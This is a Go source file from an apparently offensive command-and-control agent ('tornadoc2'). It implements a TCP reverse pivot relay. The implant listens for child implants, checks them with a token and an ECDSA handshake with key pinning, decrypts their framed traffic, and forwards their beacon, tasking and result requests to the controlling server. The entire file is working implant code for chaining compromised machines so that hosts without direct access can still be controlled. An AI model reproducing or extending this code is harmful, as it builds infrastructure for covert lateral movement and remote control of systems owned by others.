package core

import (
	"bufio"
	"crypto/ecdsa"
	"crypto/subtle"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"sync"
	"time"

	"tornadoc2/agent/internal/pivot"
)

type tcpRevRelay struct {
	parent       *Agent
	listenOn     string
	tokenBytes   []byte
	pivotPrivKey *ecdsa.PrivateKey

	mu         sync.Mutex
	listener   net.Listener
	stopped    bool
	stopCh     chan struct{}
	pinnedKeys map[string]*ecdsa.PublicKey
}

func newTCPRevRelay(parent *Agent, listenOn, tokenHex string,
	pivotPrivKey *ecdsa.PrivateKey) (*tcpRevRelay, error) {

	if listenOn == "" {
		return nil, errors.New(
			"tcp reverse pivot: listen address is empty")
	}
	raw, err := hex.DecodeString(tokenHex)
	if err != nil || len(raw) == 0 {
		return nil, fmt.Errorf(
			"tcp reverse pivot: token is not valid hex (%q): %v",
			tokenHex, err)
	}
	return &tcpRevRelay{
		parent:       parent,
		listenOn:     listenOn,
		tokenBytes:   raw,
		pivotPrivKey: pivotPrivKey,
		stopCh:       make(chan struct{}),
		pinnedKeys:   map[string]*ecdsa.PublicKey{},
	}, nil
}

func (r *tcpRevRelay) start() error {
	if r.pivotPrivKey == nil {
		return errors.New(
			"tcp reverse pivot: pivot private key not configured")
	}
	ln, err := net.Listen("tcp", r.listenOn)
	if err != nil {
		return fmt.Errorf(
			"tcp reverse pivot: listen %s: %w", r.listenOn, err)
	}
	r.mu.Lock()
	r.listener = ln
	r.mu.Unlock()
	go r.acceptLoop()
	diag("[beacon] tcp reverse pivot: listening on %s\n", r.listenOn)
	return nil
}

func (r *tcpRevRelay) stop() {
	r.mu.Lock()
	if r.stopped {
		r.mu.Unlock()
		return
	}
	r.stopped = true
	close(r.stopCh)
	ln := r.listener
	r.listener = nil
	r.mu.Unlock()
	if ln != nil {
		ln.Close()
	}
}

func (r *tcpRevRelay) acceptLoop() {
	for {
		select {
		case <-r.stopCh:
			return
		default:
		}
		r.mu.Lock()
		ln := r.listener
		r.mu.Unlock()
		if ln == nil {
			return
		}
		conn, err := ln.Accept()
		if err != nil {
			select {
			case <-r.stopCh:
				return
			case <-time.After(time.Second):
			}
			continue
		}
		go r.serve(conn)
	}
}

func (r *tcpRevRelay) lookupChildKey(fp string) (*ecdsa.PublicKey, bool) {
	r.mu.Lock()
	defer r.mu.Unlock()
	k, ok := r.pinnedKeys[fp]
	return k, ok
}

const maxRevPinnedKeys = 4096

func (r *tcpRevRelay) pinChildKey(fp string, k *ecdsa.PublicKey) bool {
	r.mu.Lock()
	defer r.mu.Unlock()
	if existing, ok := r.pinnedKeys[fp]; ok {
		return existing.Equal(k)
	}
	if len(r.pinnedKeys) >= maxRevPinnedKeys {
		diag("[beacon] tcp reverse pivot: pin table full "+
			"(%d entries); refusing new fingerprint %s\n",
			maxRevPinnedKeys, fp[:8])
		return false
	}
	r.pinnedKeys[fp] = k
	return true
}

type revFrameIO struct {
	conn net.Conn
	rd   *bufio.Reader
}

func (f *revFrameIO) WriteFrame(body []byte) error {
	var lenBuf [4]byte
	binary.BigEndian.PutUint32(lenBuf[:], uint32(len(body)))
	if _, err := f.conn.Write(lenBuf[:]); err != nil {
		return err
	}
	_, err := f.conn.Write(body)
	return err
}

func (f *revFrameIO) ReadFrame() ([]byte, error) {
	var lenBuf [4]byte
	if _, err := io.ReadFull(f.rd, lenBuf[:]); err != nil {
		return nil, err
	}
	n := binary.BigEndian.Uint32(lenBuf[:])
	if n == 0 || n > 16*1024*1024 {
		return nil, fmt.Errorf("child frame too large: %d", n)
	}
	buf := make([]byte, n)
	if _, err := io.ReadFull(f.rd, buf); err != nil {
		return nil, err
	}
	return buf, nil
}

func (r *tcpRevRelay) serve(conn net.Conn) {
	defer conn.Close()

	var sess *pivot.Session
	defer func() {
		if sess != nil {
			sess.Close()
		}
	}()

	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	rd := bufio.NewReaderSize(conn, 64*1024)
	var lenBuf [4]byte
	if _, err := io.ReadFull(rd, lenBuf[:]); err != nil {
		diag("[beacon] tcp reverse pivot: auth length: %v\n", err)
		return
	}
	n := binary.BigEndian.Uint32(lenBuf[:])
	if n == 0 || n > 1024 {
		diag("[beacon] tcp reverse pivot: bad token frame size %d\n", n)
		return
	}
	tok := make([]byte, n)
	if _, err := io.ReadFull(rd, tok); err != nil {
		diag("[beacon] tcp reverse pivot: auth read: %v\n", err)
		return
	}
	conn.SetReadDeadline(time.Time{})

	if len(r.tokenBytes) == 0 {
		diag("[beacon] tcp reverse pivot: no token configured\n")
		return
	}
	if subtle.ConstantTimeCompare(tok, r.tokenBytes) != 1 {
		diag("[beacon] tcp reverse pivot: auth failed from %s\n",
			conn.RemoteAddr().String())
		return
	}

	fio := &revFrameIO{conn: conn, rd: rd}

	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	result, err := pivot.ParentVerifyAndRespond(
		fio, r.pivotPrivKey)
	if err != nil {
		diag("[beacon] tcp reverse pivot: handshake: %v\n", err)
		return
	}
	conn.SetReadDeadline(time.Time{})

	if existing, ok := r.lookupChildKey(result.Fingerprint); ok {
		if !existing.Equal(result.PubKey) {
			diag("[beacon] tcp reverse pivot: fingerprint %s "+
				"presented a different public key\n",
				result.Fingerprint[:8])
			return
		}
	} else {
		if !r.pinChildKey(result.Fingerprint, result.PubKey) {
			return
		}
		diag("[beacon] tcp reverse pivot: pinned child %s (TOFU)\n",
			result.Fingerprint[:8])
	}

	diag("[beacon] tcp reverse pivot: child %s connected from %s\n",
		result.Fingerprint[:8], conn.RemoteAddr().String())
	defer diag("[beacon] tcp reverse pivot: child %s disconnected\n",
		result.Fingerprint[:8])

	sess = result.Session
	for {
		select {
		case <-r.stopCh:
			return
		default:
		}

		conn.SetReadDeadline(time.Now().Add(90 * time.Second))
		rawFrame, err := fio.ReadFrame()
		if err != nil {
			return
		}
		frame, err := pivot.DecodeFrame(rawFrame)
		if err != nil {
			diag("[beacon] tcp reverse pivot: bad frame: %v\n", err)
			return
		}
		plaintext, err := sess.DecryptChildToParent(frame)
		if err != nil {
			diag("[beacon] tcp reverse pivot: decrypt: %v\n", err)
			return
		}
		var env struct {
			Op   string          `json:"op"`
			Body json.RawMessage `json:"body"`
		}
		if err := json.Unmarshal(plaintext, &env); err != nil {
			diag("[beacon] tcp reverse pivot: bad envelope: %v\n", err)
			return
		}
		var path string
		switch env.Op {
		case "beacon":
			path = r.parent.profile.BeaconPath
		case "tasks":
			path = r.parent.profile.TasksPath
		case "results":
			path = r.parent.profile.ResultsPath
		}
		if path == "" {
			diag("[beacon] tcp reverse pivot: unknown op %q\n", env.Op)
			return
		}

		// Same rationale as the bind relay: the child's body is a
		// wire envelope, the parent holds no key for the child's
		// wire session, so every byte in both directions is
		// forwarded verbatim and the child does its own wire
		// decryption and shape unwrap.
		serverBody, status, relayErr := r.parent.relayPost(
			path, env.Body, result.Fingerprint, env.Op)
		if relayErr != nil || status < 200 || status >= 300 {
			errMsg := fmt.Sprintf("status %d", status)
			if relayErr != nil {
				errMsg = relayErr.Error()
			}
			diag("[beacon] tcp reverse pivot: relay: %s\n", errMsg)
			errReply, _ := json.Marshal(struct {
				Status int    `json:"status"`
				Error  string `json:"error"`
			}{Status: status, Error: errMsg})
			if respFrame, encErr :=
				sess.EncryptParentToChild(errReply); encErr == nil {
				if respBytes, encErr :=
					pivot.EncodeFrame(respFrame); encErr == nil {
					conn.SetWriteDeadline(
						time.Now().Add(30 * time.Second))
					_ = fio.WriteFrame(respBytes)
				}
			}
			return
		}

		wrapped, err := json.Marshal(struct {
			Body json.RawMessage `json:"body"`
		}{
			Body: json.RawMessage(serverBody),
		})
		if err != nil {
			return
		}

		respFrame, err := sess.EncryptParentToChild(wrapped)
		if err != nil {
			return
		}
		respBytes, err := pivot.EncodeFrame(respFrame)
		if err != nil {
			return
		}
		conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
		if err := fio.WriteFrame(respBytes); err != nil {
			return
		}
	}
}